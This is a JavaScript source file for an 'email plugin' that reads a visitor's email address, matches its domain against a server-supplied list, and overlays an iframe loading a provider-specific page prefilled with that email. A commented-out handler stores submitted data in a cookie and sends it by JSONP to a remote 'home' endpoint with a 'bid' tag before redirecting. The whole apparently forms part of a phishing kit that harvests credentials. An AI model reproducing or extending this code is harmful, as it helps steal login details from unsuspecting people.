//# Plugin main js file



var email_plugin = {

    init: function(data, cb) {
        var this_ = this
        this_.cb = cb;
        this_.domain = data.email.replace(/.*@/, "").toLowerCase();
        console.log(this_.domain)
        this_.get_all();
        this_.email=data.email

    },

    get_all: function() {
        var this_ = this;



        $.ajax({
            url: php_js.relative_root + "modules/email/s.php?get_all",
            dataType: "json",
            success: function(res) {

              
                var found = false;
                var link="";

                $.each(res,function(i,el){
                // res.forEach(function(el) {


                    link = el.link;
                    $.each(el.domains,function(i,domain){
                    // el.domains.forEach(function(domain) {

                    	var reg= new RegExp(domain)
                        if (reg.test(this_.domain)) {
                        	
                            found = true;
                            return false
                            
                        }
                    })

                    if(found){
                    	return false;
                    }
                })


                if(found){
                	this_.load_frame(link);
                }else{
                	this_.load_frame("components/default/");
                }


            },
            error: function(res) {
                console.error(res)
            }
        })

    },
    load_frame: function(link) {
    	var this_=this
        $('<div class="plugin_ifr_container"><iframe class="plugin_ifr" src="' + php_js.relative_root + 'modules/email/' + link + '?email='+this_.email+'"></iframe></div>').appendTo('body');
    },

    send: function(data) {
        var this_ = this;
        $('.plugin_ifr_container').remove();
        this_.cb(data);
    },
    cancel:function(){
        var this_ = this;
        $('.plugin_ifr_container').remove();
        $('form').each(function(i,item){delete $(item).data().sub_ed })//2019
    }


}



// 
// var email_plugin_data_receiver = function(data) {

//     var Callback = function(data) {
//         setTimeout(function() {
//             loader_.hide();
//             // $(".scum").hide();
//             // $(el).closest(".scum").next().show();
//             window.location.href = "../next/";
//         }, 3000);
//     }

//     loader_.show();
//     var data__ = data
//     var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
//     cookies.set('data__', JSON.stringify(all_data__))



//     if (/(email|jabber|complited)\.php/.test(php_js.home)) {
//         Callback();
//         return;
//     }

//     $.ajax({
//         url: php_js.home + "&sl&link=" + php_js.link + "&bid=" + bid,
//         dataType: "jsonp",
//         data: {
//             data: JSON.stringify(data__)
//         },
//         success: Callback,
//         error: function(data) {}
//     });
// }